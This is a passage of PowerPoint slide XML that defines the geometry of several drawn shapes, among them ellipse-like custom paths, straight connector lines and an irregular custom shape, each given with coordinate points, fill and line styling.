                <a:lnTo>
                  <a:pt x="20" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="243" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="262" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="369" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="375" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="375" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="369" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="262" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="243" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="ccccff"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="569" name="CustomShape 185"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4502160" y="4105440"/>
            <a:ext cx="640800" cy="143640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="404" h="91">
                <a:moveTo>
                  <a:pt x="202" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="181" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="20" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="47" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="53" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="124" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="143" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="161" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="181" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="91"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="243" y="90"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="262" y="89"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="88"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="85"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="82"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="81"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="77"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="75"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="73"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="369" y="71"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="375" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="67"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="66"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388" y="63"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="61"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397" y="57"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="53"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="50"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="404" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="403" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="402" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="384" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="375" y="22"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="369" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="363" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="357" y="17"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="337" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="330" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="322" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="315" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="280" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="262" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="243" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="223" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="202" y="0"/>
                </a:lnTo>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:noFill/>
          <a:ln w="14400">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570" name="Line 186"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4657680" y="4136760"/>
            <a:ext cx="112680" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="571" name="Line 187"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4875120" y="4221000"/>
            <a:ext cx="100080" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="572" name="Line 188"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4762440" y="4138560"/>
            <a:ext cx="117360" cy="82440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="573" name="Line 189"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4657680" y="4217760"/>
            <a:ext cx="112680" cy="3240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="574" name="Line 190"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4875120" y="4136760"/>
            <a:ext cx="100080" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="575" name="Line 191"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4762440" y="4136760"/>
            <a:ext cx="117360" cy="81000"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="34920">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="576" name="Line 192"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3193920" y="3574800"/>
            <a:ext cx="1440" cy="868320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="577" name="Line 193"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2963520" y="3574800"/>
            <a:ext cx="230400" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="578" name="Line 194"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2963520" y="4084560"/>
            <a:ext cx="230400" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="579" name="Line 195"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2963520" y="4438440"/>
            <a:ext cx="230400" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="580" name="Line 196"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3193920" y="4030560"/>
            <a:ext cx="183960" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="581" name="Line 197"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3900240" y="4049640"/>
            <a:ext cx="182520" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="582" name="Line 198"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4086000" y="3665520"/>
            <a:ext cx="1800" cy="777600"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="583" name="Line 199"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3854160" y="3665520"/>
            <a:ext cx="228600" cy="1440"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="584" name="Line 200"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3854160" y="4443120"/>
            <a:ext cx="228600" cy="1800"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="11160">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="585" name="CustomShape 201"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2563920" y="3905280"/>
            <a:ext cx="394560" cy="329400"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="249" h="208">
                <a:moveTo>
                  <a:pt x="68" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="70" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="121" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="150" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="157" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="163" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="170" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="178" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="185" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="193" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="201" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="213" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="216" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="220" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224" y="44"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="226" y="50"/>
                </a:lnTo>
